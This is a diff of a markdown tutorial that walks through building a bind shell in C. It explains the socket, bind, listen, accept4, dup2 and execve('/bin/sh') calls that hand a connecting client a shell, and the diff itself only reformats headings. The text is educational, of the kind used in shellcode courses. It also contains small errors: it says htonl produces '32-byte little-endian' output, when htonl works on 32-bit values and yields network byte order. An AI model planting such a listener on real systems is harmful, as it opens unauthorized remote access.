@@ -69,11 +69,12 @@ root
 ```
 
 ### Function Analysis
-1. Create a new Socket.
+
+#### 1. Create a new Socket.
++ For complete details see: `man socket`
 ```c 
 int socket(int domain, int type, int protocol); 
 ```  
-  + For complete details see: `man socket`
 ```c
 int domain = AF_INET
 ```
@@ -89,7 +90,7 @@ int protocol = IPPROTO_IP
 + The protocol to be used with the socket.
 + With only one protocol option in the address family, the value `0x0` is used.
 
-2. Create an IP Socket Address structure.
+#### 2. Create an IP Socket Address structure.
 ```c
 struct sockaddr_in {
   sa_family_t    sin_family; /* address family: AF_INET */
@@ -110,7 +111,7 @@ struct in_addr {
   - The `htonl()` function converts our decimal integer to 32-byte little-endian hex.    
 + For complete details see: `man ip.7`  
 
-3. Bind the IP Socket Address to Socket. 
+#### 3. Bind the IP Socket Address to Socket. 
 ```c
 int bind(int sockfd, const struct sockaddr \*addr, socklen\_t addrlen);`
 ```
@@ -123,7 +124,7 @@ int bind(int sockfd, const struct sockaddr \*addr, socklen\_t addrlen);`
     - `sizeof()` returns the length in bytes of the variable.  
   + For complete details see: `man bind`  
 
-4. Listen for connections to the TCP Socket at the IP Socket Address.  
+#### 4. Listen for connections to the TCP Socket at the IP Socket Address.  
 ```c
 int listen(int sockfd, int backlog);
 ```  
@@ -133,7 +134,7 @@ int listen(int sockfd, int backlog);
     - We only need to handle one connection at a time, therefor we will set this value to `0`.   
   + For complete details see: `man listen`  
 
-5. Accept connections to the TCP-IP Socket and create a Client Socket.  
+#### 5. Accept connections to the TCP-IP Socket and create a Client Socket.  
 ```c
 int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
 ```  
@@ -146,7 +147,7 @@ int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
   + The function will return the new Socket File-Descriptor. Save as `clientSocket`  
   + For complete details see: `man accept`  
 
-6. Transfer Standard-Input, Standard-Output, and Standard-Error to the client socket.  
+#### 6. Transfer Standard-Input, Standard-Output, and Standard-Error to the client socket.  
 ```c
 int dup2(int oldfd, int newfd);
 dup2(clientSocket, 0); // STDIN
@@ -155,7 +156,7 @@ dup2(clientSocket, 2); // STDERR
 ```   
   + For complete details see: `man dup2`  
 
-7. Spawn a `/bin/sh` shell for the client, in the connected session.  
+#### 7. Spawn a `/bin/sh` shell for the client, in the connected session.  
 ```c
 int execve(const char *pathname, char *const argv[], char *const envp[]);
 execve("/bin/sh", NULL, NULL);
